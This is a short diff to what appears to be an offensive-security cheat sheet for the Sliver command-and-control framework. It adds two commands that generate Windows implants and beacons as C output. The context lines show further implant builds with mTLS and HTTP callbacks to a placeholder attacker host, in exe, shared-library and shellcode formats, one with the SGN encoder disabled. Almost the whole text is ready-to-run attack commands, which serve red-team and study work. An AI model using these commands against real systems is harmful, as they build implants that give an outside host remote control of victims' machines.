@@ -405,6 +405,7 @@ username@c2:~/.sliver/configs$ sliver import <USERNAME>.cfg
 sliver > help generate
 sliver > generate --mtls <LHOST> --os windows --save /PATH/TO/BINARY
 sliver > generate --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --format c --save /PATH/TO/BINARY
 sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY
 sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --disable-sgn --save /PATH/TO/BINARY
 sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shared --save /PATH/TO/BINARY
@@ -416,6 +417,7 @@ sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --
 sliver > generate --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name lock-http --save /tmp/ -G
 sliver > generate beacon --mtls <LHOST> --os windows --save /PATH/TO/BINARY
 sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format c --save /PATH/TO/BINARY
 sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY
 sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --disable-sgn --save /PATH/TO/BINARY
 sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shared --save /PATH/TO/BINARY
